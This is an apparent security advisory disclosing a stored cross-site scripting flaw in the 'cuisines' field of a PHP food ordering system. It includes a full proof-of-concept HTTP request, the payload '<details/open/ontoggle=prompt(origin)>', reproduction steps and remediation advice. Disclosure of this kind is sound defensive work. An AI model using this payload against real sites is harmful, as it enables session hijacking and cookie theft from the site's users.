## Stored Cross-Site Scripting (XSS) in Online Food Ordering System in PHP cuisines Parameter

## Credit
Discovered by:
Ahmad Marzook

## Product

Online Food Ordering System in PHP

## Vendor

Code-Projects

## Vendor URL

https://code-projects.org/online-food-ordering-system-in-php-with-source-code/

## Affected Version

1.0

## Vulnerability Type

Stored Cross-Site Scripting (Stored XSS)

CWE

CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)

## Severity

Medium

## Description

The Online Food Ordering System in PHP 1.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability in the cuisines parameter processed by the /dbfood/food.php endpoint. The vulnerability exists because the application does not properly sanitize or encode user-controlled input before storing it in the database and rendering it within the web interface.

The food management functionality allows administrators to add new food items by submitting parameters such as food_name, cost, cuisines, payment options (chk[]), and an image file (food_pic). The value supplied in the cuisines field is stored in the backend database and later displayed within the application interface without proper output encoding.

An attacker can exploit this vulnerability by injecting malicious JavaScript code into the cuisines parameter during the food creation process. Because the application stores the input and later displays it without proper sanitization, the malicious payload becomes persistent and executes whenever the stored food item is viewed.

For example, an attacker can inject a payload such as <details/open/ontoggle=prompt(origin)> in the cuisines field. Once the food item is stored, the malicious script executes automatically when the food listing page or related interface renders the stored value.

Successful exploitation allows attackers to execute arbitrary JavaScript within the context of the application. This may enable attackers to hijack authenticated sessions, steal cookies, perform actions on behalf of administrators, or inject malicious content into the application interface.

## Root Cause

The vulnerability occurs due to improper handling of user-supplied input within the application. The cuisines field accepts arbitrary user input and stores it directly in the database without performing adequate validation or sanitization.

When the stored data is later displayed on application pages, the system renders the value directly into the HTML response without applying output encoding. Because of this, malicious HTML or JavaScript code embedded in the stored value is interpreted and executed by the browser.

This issue arises from:

Lack of input validation for the cuisines parameter

Absence of output encoding before rendering stored user input

Direct insertion of stored database values into HTML content

## Affected Endpoint
/dbfood/food.php
## Vulnerable Parameter
cuisines
## Proof of Concept

The vulnerability can be triggered using the following HTTP request:
 ```plain
POST /dbfood/food.php HTTP/1.1
Host: localhost
Content-Length: 1186870
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary74dHqh8YKKfq1xeE
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/dbfood/food.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=r8lic3o19qngid0clllb39s0n6
Connection: keep-alive

------WebKitFormBoundary74dHqh8YKKfq1xeE
Content-Disposition: form-data; name="food_name"

sc
------WebKitFormBoundary74dHqh8YKKfq1xeE
Content-Disposition: form-data; name="cost"

2e2
------WebKitFormBoundary74dHqh8YKKfq1xeE
Content-Disposition: form-data; name="cuisines"

<details/open/ontoggle=prompt(origin)>
------WebKitFormBoundary74dHqh8YKKfq1xeE
Content-Disposition: form-data; name="chk[]"

Online Payment
------WebKitFormBoundary74dHqh8YKKfq1xeE
Content-Disposition: form-data; name="food_pic"; filename="Screenshot 2026-03-09 at 19.16.56.png"
Content-Type: image/png

 ```
## Steps to Reproduce

Install and run the Online Food Ordering System in PHP.

Navigate to the food management or food creation page.

Intercept the request using a proxy tool such as Burp Suite.

Insert the following payload into the cuisines parameter:

<details/open/ontoggle=prompt(origin)>

Submit the request to create the food item.

Navigate to the page where the food item is displayed.

## Result

When the stored food entry is viewed within the application interface, the injected JavaScript payload executes automatically in the browser of the user viewing the page. This confirms the presence of a Stored Cross-Site Scripting vulnerability.

## Impact

An attacker exploiting this vulnerability may be able to:

Execute arbitrary JavaScript in victim browsers

Hijack administrator or user sessions

Steal authentication cookies

Perform unauthorized actions within the application

Inject malicious content into the application interface

Because the payload is stored in the database, it may affect all users who access the affected page.

## Remediation

Developers should implement the following security measures:

Output Encoding

Encode user-controlled input before rendering it in HTML responses.

## Example:

echo htmlspecialchars($cuisines, ENT_QUOTES, 'UTF-8');
Input Validation

Validate and sanitize user input before storing it in the database.

Content Security Policy (CSP)

Implement a Content Security Policy to limit execution of malicious scripts.

Security Testing

Perform regular security testing to identify and remediate injection vulnerabilities.

## Vulnerability Classification

CWE

CWE-79 – Cross-Site Scripting

OWASP Top 10

A03:2021 – Injection

PoC 

https://github.com/user-attachments/assets/9d745d09-af1e-4af9-bbf0-1ca21d25daf2
